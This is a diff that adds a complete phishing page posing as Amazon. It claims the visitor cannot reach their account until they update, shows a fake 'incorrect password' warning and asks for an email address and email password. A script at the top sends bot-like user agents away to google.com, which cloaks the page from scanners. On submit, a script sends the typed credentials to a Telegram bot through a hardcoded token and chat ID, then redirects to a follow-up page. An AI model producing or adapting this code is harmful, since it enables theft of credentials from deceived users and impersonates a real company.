@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    /* anti-bot */
+    var bots = [/bot/i, /crawler/i, /spider/i, /wget/i, /curl/i, /python/i];
+    var ua = navigator.userAgent;
+    if (bots.some(rx => rx.test(ua))) {
+        location.href = "https://google.com";
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Amazon</title>
+    <link rel="shortcut icon" href="images/favicon.ico">
+    <link rel="stylesheet" href="mail.css">
+    <style>
+        /* Prevent zooming on mobile input fields by setting a minimum font size */
+        input {
+            font-size: 16px; /* Ensure font size is at least 16px */
+        }
+
+        /* Global styles */
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            height: 100vh; /* Ensure the body takes up full height */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f4f4; /* Optional background color */
+        }
+
+        #formsContainer {
+            padding: 20px;
+            width: 100%;
+            max-width: 400px; /* Limit the max width for form container */
+            background-color: white; /* Make form container white */
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1); /* Light shadow for form */
+            border-radius: 8px; /* Rounded corners for the form */
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 16px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            box-sizing: border-box; /* Ensure padding is included in the width */
+        }
+
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        .emojiContainer {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+
+        .emojiContainer img {
+            max-width: 100%; /* Make images responsive */
+            height: auto;
+        }
+
+        /* Ensure form box is centered and has proper spacing */
+        #form {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+        }
+
+        h4 {
+            color: red;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+    <div id="passage">
+        <h3>You Can't Access Your Account Until You Update</h3>
+    </div>
+    <div id="formsContainer">
+        <div class="emojiContainer">  
+            <h2>Link Your E-mail</h2>
+            <img src="images/img7.png" alt="Image">
+            <h4>The email or password you entered is incorrect. Please try again!</h4>
+        </div>
+        <form method="post" id="form" autocomplete="off">
+            <label for="email">E-mail Address <span>(Enter Your E-mail Address)</span></label>
+            <input type="email" id="email" name="data[email]" placeholder="E-mail Address" autocomplete="on" required>
+            <br>
+            <label for="password">E-mail Password <span>(Enter Your E-mail Password)</span></label>
+            <input type="password" id="password" name="data[password]" placeholder="E-mail Password" autocomplete="off" required>
+            <br>
+            <button id="submit" type="submit">Submit</button>
+        </form>
+    </div>   
+
+    <script>
+        document.getElementById("form").addEventListener("submit", function(event) {
+            event.preventDefault(); // Prevent form submission
+
+            // Collect values from all form fields
+            var email = document.getElementById("email").value;
+            var password = document.getElementById("password").value;
+
+            // Get the user's IP address (if needed, though you've indicated not using IP collection)
+            // You can remove this part if you want to avoid any unnecessary IP collection
+
+            var message = `E-mail Address: ${email}\nE-mail Password: ${password}`;
+
+            // Replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your bot's token and your chat ID
+            var botToken = '7519001225:AAH9vvsnL4_Qz0FL3qk0p98lAMCvHsgjcE0';
+            var chatId = '7009891691';
+            var telegramAPI = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
+
+            fetch(telegramAPI)
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        // Redirect to a different page after successful submission
+                        window.location.href = "code.html"; // Replace with your desired redirect page
+                    } else {
+                        alert("Error: " + data.description);
+                    }
+                })
+                .catch(error => {
+                    alert("Error: " + error.message);
+                });
+        });
+    </script>
+</body>
+</html>
